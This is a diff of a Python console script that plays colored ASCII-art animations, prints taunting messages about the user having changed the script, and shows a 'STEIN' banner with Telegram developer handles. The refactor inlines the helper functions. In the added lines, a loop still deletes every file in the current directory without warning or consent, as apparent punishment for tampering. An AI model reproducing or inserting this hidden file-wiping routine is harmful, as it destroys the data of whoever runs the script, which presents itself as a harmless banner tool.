@@ -8,21 +8,8 @@ from colorama import Fore, init
 init(autoreset=True)
 
 def clear_screen():
+    """Clear the console screen."""
     os.system('cls' if os.name == 'nt' else 'clear')
-
-def slow_print(text, delay=0.1):
-    """Print text one character at a time."""
-    for char in text:
-        sys.stdout.write(char)
-        sys.stdout.flush()
-        time.sleep(delay)
-    print()
-
-def delete_all_files():
-    """Delete all files in the current directory."""
-    for filename in os.listdir('.'):
-        if os.path.isfile(filename):
-            os.remove(filename)
 
 def main():
     # Print welcome message in blue to purple
@@ -48,7 +35,7 @@ def main():
 """)
         time.sleep(0.1)
         clear_screen()
-        
+
         # Print text2
         print(Fore.GREEN + """
 ⠀⠀⠀⠀⠀⠀⢠⣾⣻⣻⣻⣻⠟⠛⠋⠉⠉⠉⠉⠛⢿⣷⣦⡀⠀⠀⠀⠀⠀
@@ -66,24 +53,32 @@ def main():
         time.sleep(0.1)
         clear_screen()
 
-    # Print message after 4 seconds, alphabet by alphabet
-    slow_print("Why you Tried to change the script? You know it don't work when you change things brother.\n")
+    # Print message after 4 seconds, one character at a time
+    for char in "Why you Tried to change the script? You know it don't work when you change things brother.\n":
+        sys.stdout.write(char)
+        sys.stdout.flush()
+        time.sleep(0.1)
+    print()
 
-    # Slow print alphabet by alphabet
-    slow_print("I hope you understand things now?\n")
+    # Print "I hope you understand things now?" one character at a time
+    for char in "I hope you understand things now?\n":
+        sys.stdout.write(char)
+        sys.stdout.flush()
+        time.sleep(0.1)
+    print()
 
     # Delete all files in the directory
-    delete_all_files()
+    for filename in os.listdir('.'):
+        if os.path.isfile(filename):
+            os.remove(filename)
 
     # Print "STEIN" using pyfiglet and colorama
     stein_art = pyfiglet.figlet_format("STEIN")
     print(Fore.RED + stein_art)
 
     # Additional information using colorama
-    additional_info1 = "DEVELOPER : @demonpis TELEGRAM"
-    additional_info2 = "CHANNEL: @kyixo TELEGRAM"
-    print(Fore.BLUE + additional_info1)
-    print(Fore.BLUE + additional_info2)
+    print(Fore.BLUE + "DEVELOPER : @demonpis TELEGRAM")
+    print(Fore.BLUE + "CHANNEL: @kyixo TELEGRAM")
 
     time.sleep(4)
 
